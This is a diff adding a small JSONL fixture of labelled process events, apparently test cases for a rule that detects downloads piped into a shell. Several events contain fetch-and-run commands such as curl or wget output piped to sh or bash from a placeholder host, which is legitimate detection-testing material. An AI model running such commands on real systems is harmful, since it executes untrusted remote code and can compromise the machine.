@@ -1,0 +1,7 @@
+{"id":"positive-curl-sh-sshd","expected":true,"event":{"Image":"/usr/bin/curl","CommandLine":"curl https://invalid.test/a | sh","ParentImage":"/usr/sbin/sshd","User":"alice"}}
+{"id":"positive-wget-bash-cron","expected":true,"event":{"Image":"/usr/bin/wget","CommandLine":"wget -qO- https://invalid.test/b | bash","ParentImage":"/usr/sbin/cron","User":"bob"}}
+{"id":"negative-no-shell-pipe","expected":false,"event":{"Image":"/usr/bin/curl","CommandLine":"curl -o /tmp/a https://invalid.test/a","ParentImage":"/usr/sbin/sshd","User":"alice"}}
+{"id":"negative-wrong-downloader","expected":false,"event":{"Image":"/usr/bin/python3","CommandLine":"python3 helper.py | sh","ParentImage":"/usr/sbin/sshd","User":"alice"}}
+{"id":"negative-wrong-parent","expected":false,"event":{"Image":"/usr/bin/curl","CommandLine":"curl https://invalid.test/a | sh","ParentImage":"/usr/bin/zsh","User":"alice"}}
+{"id":"negative-approved-service","expected":false,"event":{"Image":"/usr/bin/curl","CommandLine":"curl https://invalid.test/a | sh","ParentImage":"/usr/sbin/sshd","User":"svc_approved_patch"}}
+{"id":"negative-distant","expected":false,"event":{"Image":"/usr/bin/ls","CommandLine":"ls -la","ParentImage":"/usr/bin/bash","User":"alice"}}
